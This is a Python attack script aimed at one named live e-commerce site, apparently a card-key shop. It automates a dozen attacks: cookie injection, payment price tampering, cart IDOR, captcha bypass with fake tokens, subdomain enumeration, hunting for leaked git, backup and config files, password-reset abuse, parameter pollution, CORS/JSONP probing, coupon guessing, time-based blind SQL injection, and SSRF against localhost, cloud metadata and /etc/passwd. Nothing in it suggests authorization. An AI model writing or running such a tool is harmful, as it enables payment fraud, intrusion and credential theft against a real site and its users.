#!/usr/bin/env python3
"""qq1.lol UNEXPLORED vectors — mysid, vaptcha offline, cart, price tamper, fenzhan, git, CORS, HPP, findpwd"""
import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "unexplored.log"
HITS = OUT / "unexplored_hits.jsonl"
JAR = str(OUT / ".unexplored_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HDR = ["-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "14")


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:5000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def curl(url, post=None, extra=None, cookie_set=None):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA] + HDR
    if extra:
        cmd += extra
    if cookie_set:
        cmd += ["-H", f"Cookie: {cookie_set}"]
    if post is not None:
        if isinstance(post, dict) and post.get("_json"):
            cmd += ["-X", "POST", "-H", "Content-Type: application/json", "-d", post["_json"]]
        else:
            cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def get_tokens():
    buy = curl(f"{BASE}/?mod=buy&cid=14&tid=131")
    csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    csrf = csrf_m.group(1) if csrf_m else ""
    hs = ""
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    if hs_m:
        try:
            hs = subprocess.run(
                ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
                capture_output=True, text=True, timeout=5,
            ).stdout.strip()
        except Exception:
            pass
    return csrf, hs


def good(body, skip=()):
    if not body or len(body) < 8:
        return False
    if any(x in body for x in ("404 Not Found", "403 Forbidden", "No Act", "请提供用户") if x not in skip):
        if "请提供" in body:
            return False
    markers = ("kminfo", "卡密", "----", "password", "mysql", "root:", "admin", "成功", "api_key", "syskey", "DB_")
    return any(m in body for m in markers) or ('"code":0' in body and "getcount" not in str(skip))


# --- 1. mysid cookie injection ---
def test_mysid():
    log("=== [1] mysid cookie injection ===")
    csrf, hs = get_tokens()
    for mysid in ("admin", "1", "25945", "buyi", "test", "../../../etc/passwd", "' OR '1'='1"):
        cookies = f"mysid={quote(mysid)}; PHPSESSID=probe"
        body = curl(f"{BASE}/ajax.php?act=pay", "POST",
                    f"tid=131&num=1&hashsalt={hs}&csrf_token={csrf}", cookie_set=cookies)
        if good(body):
            hit("mysid", mysid, body)
    # hidden inputname=hide products
    for tid in ("102", "4", "83"):
        page = curl(f"{BASE}/?mod=buy&cid=4&tid={tid}")
        if 'inputname="hide"' in page or "inputname='hide'" in page:
            log(f"  tid={tid} has hide input")


# --- 2. Price / pay tampering ---
def test_price_tamper():
    log("=== [2] Price tampering ===")
    csrf, hs = get_tokens()
    payloads = [
        f"tid=131&num=1&money=0.01&price=0.01&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",
        f"tid=131&num=1&money=0&price=0&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",
        f"tid=131&num=-1&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",
        f"tid=4&num=1&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",  # cheaper tid
        f"tid=131&num=1&inputvalue=t&hashsalt={hs}&csrf_token={csrf}&need=0.01",
        f"tid=102&num=1&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",  # 219 item
        # tid swap: pay for tid 4 (189) but claim 131 (99) - parameter pollution
        f"tid=131&tid=4&num=1&inputvalue=t&hashsalt={hs}&csrf_token={csrf}",
    ]
    for p in payloads:
        body = curl(f"{BASE}/ajax.php?act=pay", p)
        if body and '"code":0' in body:
            hit("price_tamper", p[:80], body)
        elif body:
            log(f"  pay: {body[:100]}")


# --- 3. Cart IDOR ---
def test_cart():
    log("=== [3] Cart addcart/editcart/delcart ===")
    csrf, _ = get_tokens()
    for act in ("addcart", "editcart", "delcart", "cart_info", "cart_list"):
        for post in [
            f"tid=131&num=1&csrf_token={csrf}",
            f"id=1&num=99&csrf_token={csrf}",
            f"id=25945&csrf_token={csrf}",
            f"tid=131&num=-1&csrf_token={csrf}",
        ]:
            body = curl(f"{BASE}/ajax.php?act={act}", post)
            if good(body) or (body and '"code":0' in body and act not in ("cart_list",)):
                hit("cart", f"{act} {post[:50]}", body)


# --- 4. Vaptcha offline bypass ---
def test_vaptcha():
    log("=== [4] Vaptcha offline bypass ===")
    csrf, hs = get_tokens()
    # offline demo token from faka.js
    offline_urls = [
        "https://management.vaptcha.com/api/v3/demo/offline",
        "https://qq1.lol/management.vaptcha.com/api/v3/demo/offline",
    ]
    for url in offline_urls:
        body = curl(url)
        if body and len(body) > 20:
            log(f"  offline: {body[:100]}")
    fake_tokens = ["offline_token", "test", "demo", "bypass", "vaptcha_offline"]
    for token in fake_tokens:
        body = curl(f"{BASE}/ajax.php?act=pay", "POST",
                    f"tid=131&num=1&inputvalue=t&hashsalt={hs}&token={token}&csrf_token={csrf}")
        if body and '"code":0' in body:
            hit("vaptcha_bypass", token, body)
        # geetest fake
        body2 = curl(f"{BASE}/ajax.php?act=pay", "POST",
                     f"tid=131&num=1&inputvalue=t&hashsalt={hs}&geetest_challenge=x&geetest_validate=x&geetest_seccode=x|jordan&csrf_token={csrf}")
        if body2 and '"code":0' in body2:
            hit("geetest_bypass", "fake", body2)


# --- 5. Fenzhan / zid / subdomain ---
def test_fenzhan():
    log("=== [5] Fenzhan zid ===")
    for zid in range(1, 20):
        body = curl(f"{BASE}/?zid={zid}")
        if body and "404" not in body[:80] and len(body) > 500:
            gc = curl(f"{BASE}/ajax.php?act=getcount", extra=["-H", f"Cookie: zid={zid}"])
            if gc and '"code":0' in gc:
                hit("fenzhan", f"zid={zid}", gc)
    subs = ["www", "m", "wap", "fenzhan", "shop", "pay", "api", "admin", "test", "dev",
            "buyi", "qq", "card", "kami", "1", "2", "478"]
    for s in subs:
        for dom in ("qq1.lol", "qq0.lol"):
            host = f"{s}.{dom}"
            body = curl(f"https://{host}/ajax.php?act=getcount", extra=["-H", f"Host: {host}"])
            if body and '"code":0' in body:
                hit("subdomain", host, body)


# --- 6. Git / backup / well-known ---
def test_leaks():
    log("=== [6] Git/backup/well-known ===")
    paths = [
        ".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD", ".git/packed-refs",
        ".git/refs/heads/master", ".git/refs/heads/main", ".git/COMMIT_EDITMSG",
        ".svn/wc.db", ".svn/entries", ".hg/hgrc",
        "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
        ".well-known/security.txt", ".well-known/openid-configuration",
        "web.config", "WEB-INF/web.xml", "Dockerfile", ".dockerignore",
        "backup.zip", "backup.tar.gz", "www.zip", "site.tar.gz", "data.zip",
        "qq1.zip", "qq1.lol.tar.gz", "sql.zip", "db.zip", "database.zip",
        "config.php.bak", "config.php.old", "config.php.swp", "config.php~",
        "ajax.php.bak", "api.php.bak", ".env.production", ".env.local",
        "runtime/", "runtime/log/", "runtime/cache/", "data/",
        "uploads/", "upload/", "files/", "attachment/",
    ]
    for p in paths:
        body = curl(f"{BASE}/{p}")
        if not body or len(body) < 5:
            continue
        if body.startswith("ref:") or "[core]" in body or "repositoryformatversion" in body:
            hit("git_leak", p, body[:500])
        elif body.startswith("PK") or "CREATE TABLE" in body:
            hit("backup_leak", p, f"size={len(body)}")
        elif "<?php" in body or "DB_" in body or "password" in body.lower():
            hit("config_leak", p, body[:500])
        elif "Disallow" in body or "Sitemap" in body:
            hit("robots", p, body[:300])


# --- 7. findpwd / sendcode / sms ---
def test_findpwd():
    log("=== [7] findpwd/sendcode ===")
    csrf, _ = get_tokens()
    for ep in ("user/findpwd.php", "sup/findpwd.php", "user/ajax.php?act=findpwd",
               "ajax.php?act=findpwd", "ajax.php?act=sendcode", "ajax.php?act=sendsms"):
        for user in ("admin", "buyi", "buyiq", "test"):
            body = curl(f"{BASE}/{ep}" if "?" not in ep else f"{BASE}/{ep}",
                        f"user={user}&type=qq&csrf_token={csrf}" if "ajax" in ep else f"user={user}")
            if body and good(body):
                hit("findpwd", f"{ep} user={user}", body)
            elif body and len(body) > 30 and "404" not in body[:60]:
                log(f"  {ep} {user}: {body[:80]}")


# --- 8. HPP / JSON / debug params ---
def test_hpp_json():
    log("=== [8] HPP/JSON/debug ===")
    csrf, hs = get_tokens()
    # HPP
    for url in [
        f"{BASE}/ajax.php?act=order&act=admin",
        f"{BASE}/ajax.php?act=getcount&act=export",
        f"{BASE}/%61pi.php?act=search&act=dump&id=1&key=test",
    ]:
        body = curl(url, f"id=1&skey=test&csrf_token={csrf}")
        if good(body):
            hit("hpp", url, body)
    # JSON POST
    for act in ("order", "pay", "login", "query", "admin"):
        body = curl(f"{BASE}/ajax.php?act={act}", {"_json": json.dumps({"id": 1, "skey": "test", "csrf_token": csrf})})
        if good(body):
            hit("json_post", act, body)
    # debug params
    for q in ("?debug=1", "?test=1", "?dev=1", "?XDEBUG_SESSION_START=1", "?display_errors=1"):
        body = curl(f"{BASE}/ajax.php{q}?act=getcount")
        if body and ("error" in body.lower() or "stack" in body.lower() or "warning" in body.lower()):
            hit("debug", q, body)


# --- 9. CORS / JSONP ---
def test_cors():
    log("=== [9] CORS/JSONP ===")
    for origin in ("https://evil.com", "null", "https://qq1.lol.evil.com"):
        body = curl(f"{BASE}/ajax.php?act=getcount",
                    extra=["-H", f"Origin: {origin}", "-H", "Access-Control-Request-Method: GET"])
        if body and '"code":0' in body:
            log(f"  origin={origin}: data returned")
    for cb in ("callback", "jsonp", "cb"):
        body = curl(f"{BASE}/ajax.php?act=getcount&{cb}=alert")
        if body and ("alert(" in body or "callback(" in body.lower()):
            hit("jsonp", cb, body)


# --- 10. Coupon / seckill / cutshop mod ---
def test_marketing_mod():
    log("=== [10] Marketing mod pages ===")
    csrf, hs = get_tokens()
    for mod in ("cutshop", "groupshop", "seckill", "coupon", "cart", "gift", "invite", "fenxiang"):
        page = curl(f"{BASE}/?mod={mod}")
        if page and len(page) > 300 and "404" not in page[:80]:
            log(f"  mod={mod} len={len(page)}")
            if "kminfo" in page or "免费领取" in page:
                hit("mod_leak", mod, page[:500])
    for act in ("coupon", "cutshop", "groupshop", "seckill"):
        for code in ("VIP", "FREE", "100", "qq1", "buyi", "666", "888", "test", ""):
            body = curl(f"{BASE}/ajax.php?act={act}", "POST",
                        f"code={code}&tid=131&csrf_token={csrf}")
            if body and '"code":0' in body:
                hit("coupon", f"{act} code={code}", body)


# --- 11. Blind SQLi time ---
def test_blind_sqli():
    log("=== [11] Blind SQLi ===")
    csrf, _ = get_tokens()
    payloads = [
        ("order", f"id=1' AND SLEEP(3)-- -&skey=test"),
        ("order", f"id=1 AND SLEEP(3)&skey=test"),
        ("query", f"data=1' AND SLEEP(3)-- -&csrf_token={csrf}"),
        ("getcount", "yxts=1' AND SLEEP(3)-- -"),
    ]
    for act, post in payloads:
        t0 = time.time()
        curl(f"{BASE}/ajax.php?act={act}", post if "csrf" in post or "skey" in post else None
             if act == "getcount" else post)
        elapsed = time.time() - t0
        if elapsed > 2.5:
            hit("sqli_time", f"{act} elapsed={elapsed:.1f}s", post)


# --- 12. getshareid SSRF ---
def test_ssrf():
    log("=== [12] SSRF getshareid ===")
    _, hs = get_tokens()
    targets = [
        "http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/",
        "http://127.0.0.1:3306/", "file:///etc/passwd",
        "http://qq1.lol@", "http://45.158.21.213/",
    ]
    for url in targets:
        body = curl(f"{BASE}/ajax.php?act=getshareid", f"url={quote(url)}&hashsalt={hs}")
        if body and len(body) > 20 and "code\":-1" not in body[:30]:
            hit("ssrf", url, body)


def main():
    log("=== UNEXPLORED PROBE START ===")
    curl(BASE + "/")
    test_mysid()
    test_price_tamper()
    test_cart()
    test_vaptcha()
    test_fenzhan()
    test_leaks()
    test_findpwd()
    test_hpp_json()
    test_cors()
    test_marketing_mod()
    test_blind_sqli()
    test_ssrf()
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== UNEXPLORED DONE hits={n} ===")


if __name__ == "__main__":
    main()
